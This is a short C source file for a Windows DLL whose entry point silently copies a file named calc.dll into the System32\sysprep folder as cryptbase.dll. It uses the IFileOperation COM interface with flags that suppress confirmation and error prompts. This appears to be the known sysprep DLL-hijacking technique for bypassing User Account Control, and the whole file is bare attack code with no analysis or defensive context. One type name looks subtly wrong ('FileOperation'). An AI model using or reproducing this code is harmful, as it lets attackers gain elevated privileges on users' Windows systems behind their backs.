#include <stdio.h>
#include <Shobjidl.h>
#include <Windows.h>

#pragma comment(lib, "Ole32.lib")
#pragma comment(lib, "shell32.lib")

int WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
FileOperation  *pfo;
IShellItem      *psiFrom = NULL;
IShellItem      *psiTo = NULL;
LPCWSTR pszSrcItem = L"calc.dll";
LPCWSTR pszNewName = L"cryptbase.dll";
LPCWSTR pszDest    = L"C:\\windows\\System32\\sysprep";

HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
if (SUCCEEDED(hr))
{
 hr = CoCreateInstance(CLSID_FileOperation, NULL, CLSCTX_ALL, IID_PPV_ARGS(&pfo));
 if (SUCCEEDED(hr))
 {
 hr = pfo->SetOperationFlags( FOF_NOCONFIRMATION |
 FOF_SILENT |
 FOFX_SHOWELEVATIONPROMPT |
 FOFX_NOCOPYHOOKS |
 FOFX_REQUIREELEVATION |
 FOF_NOERRORUI );
 if (SUCCEEDED(hr))
 {
 hr = SHCreateItemFromParsingName(pszSrcItem, NULL, IID_PPV_ARGS(&psiFrom));
 if (SUCCEEDED(hr))
 {
 if (NULL != pszDest)
 {
 hr = SHCreateItemFromParsingName(pszDest, NULL, IID_PPV_ARGS(&psiTo));
 }
 if (SUCCEEDED(hr))
 {
 hr = pfo->CopyItem(psiFrom, psiTo, pszNewName, NULL);
 if (NULL != psiTo)
 {
 psiTo->Release();
 }
 }
 psiFrom->Release();
 }
 if (SUCCEEDED(hr))
 {
 hr = pfo->PerformOperations();
 }
 }
 pfo->Release();
 }
 CoUninitialize();
 }
 return 0;
}